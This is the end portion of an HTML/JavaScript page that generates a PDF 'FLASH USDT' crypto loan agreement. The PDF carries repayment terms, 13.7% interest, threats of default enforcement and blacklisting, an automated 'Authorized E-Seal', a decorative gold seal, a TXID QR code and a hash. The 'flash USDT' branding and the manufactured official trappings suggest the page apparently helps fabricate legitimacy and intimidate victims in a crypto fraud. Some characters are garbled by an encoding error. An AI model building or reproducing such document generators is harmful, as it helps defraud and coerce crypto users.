  addParagraph(`3.2. The Borrower irrevocably undertakes to repay the full principal amount of ${amount} (or its exact blockchain-equivalent) to the Repayment Address specified above within a maximum of 365 (three hundred sixty-five) calendar days from the date of disbursement.`);
  addParagraph('3.3. Repayment may be made in one lump sum or in multiple installments, provided that by the final due date the full principal and all applicable fees have been successfully received on-chain by the Provider.');
  addParagraph('3.4. An annualized interest rate of 13.7% (thirteen point seven percent) applies to the outstanding principal balance for the duration of the credit period. The Provider may additionally charge fixed or variable service fees, gas/network fees and administrative charges as disclosed in the platform terms.');
  addParagraph('3.5. In the event of any late repayment beyond the 365-day period, the Provider reserves the right to apply penalty interest, increased service fees and additional recovery costs, all of which shall be borne exclusively by the Borrower.');

  addSectionTitle('4. Blockchain Records, Finality and Irreversibility');
  addParagraph('4.1. All transfers, including disbursement and repayment, are permanently recorded on the relevant blockchain (e.g. TRON, Ethereum, BSC, Bitcoin or equivalent). These records are immutable, transparent and publicly verifiable.');
  addParagraph('4.2. The TXID and related on-chain logs constitute conclusive and binding evidence of the existence, timing, and amount of the transaction and the associated obligations under this Agreement.');
  addParagraph('4.3. The Borrower is solely responsible for checking destination addresses, network selection and amounts before confirming any transaction. The Provider is not liable for mis-sent funds, transfers to incorrect or third-party addresses, or funds lost due to user error.');

  addSectionTitle('5. Default, Enforcement and Sanctions');
  addParagraph('5.1. A "Default Event" shall occur automatically and without further notice if the Borrower fails to fully repay the principal and applicable charges within 365 calendar days, or attempts to evade repayment, or engages in suspicious or prohibited activities.');
  addParagraph('5.2. In case of Default Event, the Provider may, at its sole discretion and without further consent of the Borrower: (i) accelerate all outstanding obligations and declare the entire debt immediately due and payable; (ii) suspend, restrict or permanently block the Borrower‚Äôs access to the Platform and any connected services; (iii) forward the case to third-party collection agencies and legal counsel; (iv) report the Borrower and relevant data to risk-monitoring, fraud-prevention and credit intelligence networks, where legally permitted.');
  addParagraph('5.3. The Provider is entitled to pursue cross-border enforcement, asset tracing and legal proceedings before competent courts and authorities, as determined by the Provider‚Äôs domicile and operational structure at the time of the dispute.');
  addParagraph('5.4. The Borrower acknowledges that non-repayment may lead to severe financial and reputational consequences, including but not limited to blacklisting on internal and external risk databases, and restrictions on future access to digital asset services.');

  addSectionTitle('6. Risk Disclosure, Compliance and Prohibited Use');
  addParagraph('6.1. Digital asset markets are highly volatile and speculative. The Borrower bears the full market risk related to the use, conversion or holding of the loaned assets.');
  addParagraph('6.2. The Provider operates under strict internal compliance standards, including anti-money laundering (AML), counter-terrorist financing (CTF), sanctions screening and fraud-prevention protocols. Where required or permitted by applicable rules, information may be shared with competent authorities and compliance partners.');
  addParagraph('6.3. The Borrower expressly undertakes not to use the provided assets for illegal gambling, narcotics trade, human trafficking, sanctions evasion, terrorism financing, or any other unlawful or high-risk activities. Any indication of such use may lead to immediate suspension of services and reporting to relevant authorities.');

  addSectionTitle('7. Explicit Consent and Borrower Acknowledgement');
  addParagraph('7.1. By submitting the TXID and using the FLASH USDT platform, the Borrower confirms that they have carefully read, understood and accepted this Agreement, the general platform Terms of Use and the Privacy Policy.');
  addParagraph('7.2. The Borrower confirms that the wallet used for receiving the assets is under their exclusive control, and that all provided identity and contact information is accurate and up-to-date.');
  addParagraph('7.3. The Borrower acknowledges and accepts that this Agreement, the Contract ID, the associated blockchain TXID and the cryptographic hash referenced below may be stored and relied upon as evidence in any dispute, investigation or enforcement action.');

  addSectionTitle('8. Digital Signature, Hash and Verification');
  addParagraph(`8.1. This Agreement is bound to the following unique Contract ID: ${contractId}.`);
  addParagraph('8.2. The cryptographic digest below links the core transaction data and this Agreement text for integrity verification (SHA-256):');
  addParagraph(`SHA-256: ${sha256}`);
  addParagraph('8.3. Any alteration of the Agreement text or underlying data after issuance will result in a hash mismatch and may render such altered document invalid.');

  // ---------- ƒ∞mza bloklarƒ± ----------
  ensureSpace(160);
  pdf.setFont('helvetica','bold');
  pdf.setFontSize(11);
  pdf.setTextColor(255,255,255);
  pdf.text('PROVIDER ‚Äî AUTHORIZED DIGITAL SEAL:', marginLeft, y); y += 16;
  pdf.setFont('helvetica','normal');
  pdf.setFontSize(10);
  pdf.setTextColor(220,230,250);
  pdf.text('Name / Entity: FLASH USDT', marginLeft, y); y += 13;
  pdf.text('Designation : FLASHLOAN USD CREDIT ‚Äî Authorized E-Seal', marginLeft, y); y += 13;
  pdf.text('Signature   : ______________________________  (Automated Digital Authorization)', marginLeft, y); y += 13;
  pdf.text('Date        : ' + generatedAt.toLocaleString(), marginLeft, y); y += 22;

  pdf.setFont('helvetica','bold');
  pdf.setFontSize(11);
  pdf.setTextColor(255,255,255);
  pdf.text('BORROWER ‚Äî ACKNOWLEDGEMENT BLOCK:', marginLeft, y); y += 16;
  pdf.setFont('helvetica','normal');
  pdf.setFontSize(10);
  pdf.setTextColor(220,230,250);
  pdf.text('Full Name   : ' + safe(data.user_fullname || '.............................................'), marginLeft, y); y += 13;
  pdf.text('Signature   : ______________________________  (Wet Ink / Qualified E-Signature if applicable)', marginLeft, y); y += 13;
  pdf.text('Date        : __________________', marginLeft, y);

  // ---------- QR + GOLD SEAL ----------
  const totalPages = pdf.getNumberOfPages();
  pdf.setPage(totalPages);
  const bottomY = pageHeight - 130;

  try {
    const qrCanvas = document.createElement('div');
    new QRCode(qrCanvas, { text: explorerUrl, width: 110, height: 110 });
    const imgEl = qrCanvas.querySelector('img');
    const qrData = imgEl ? imgEl.src : null;
    if (qrData) {
      pdf.addImage(qrData, 'PNG', marginLeft, bottomY, 110, 110);
      pdf.setFont('helvetica','normal');
      pdf.setFontSize(9);
      pdf.setTextColor(180,200,255);
      pdf.text('Scan to verify TXID on blockchain explorer', marginLeft, bottomY - 12);
    }
  } catch(e){}

  const sealX = pageWidth - marginRight - 60;
  const sealY = bottomY + 40;
  pdf.setDrawColor(255,215,0);
  pdf.setLineWidth(2);
  pdf.circle(sealX, sealY, 46, 'S');
  pdf.setDrawColor(210,210,215);
  pdf.setLineWidth(1.2);
  pdf.circle(sealX, sealY, 34, 'S');
  pdf.setFont('helvetica','bold');
  pdf.setFontSize(9);
  pdf.setTextColor(255,215,0);
  pdf.text('FLASHLOAN', sealX, sealY - 4, { align: 'center' });
  pdf.text('USD CREDIT', sealX, sealY + 8, { align: 'center' });
  pdf.setFont('helvetica','normal');
  pdf.setFontSize(7);
  pdf.text('AUTHORIZED E-SEAL', sealX, sealY + 20, { align: 'center' });

  pdf.setDrawColor(0,240,255);
  pdf.line(marginLeft, pageHeight - 60, pageWidth - marginRight, pageHeight - 60);
  pdf.setFont('helvetica','normal');
  pdf.setFontSize(8);
  pdf.setTextColor(180,200,255);
  const footerText = `Generated: ${generatedAt.toLocaleString()}  |  Explorer: ${explorerUrl}`;
  const footerLines = pdf.splitTextToSize(footerText, contentWidth);
  pdf.text(footerLines, marginLeft, pageHeight - 45);

  const safeNamePart = txid && txid.length > 6 ? txid.slice(0,8).replace(/[^a-zA-Z0-9]/g,'') : Date.now().toString(36);
  pdf.save(`FlashLoan_Agreement_${safeNamePart}.pdf`);
});
</script>
</body>
</html>
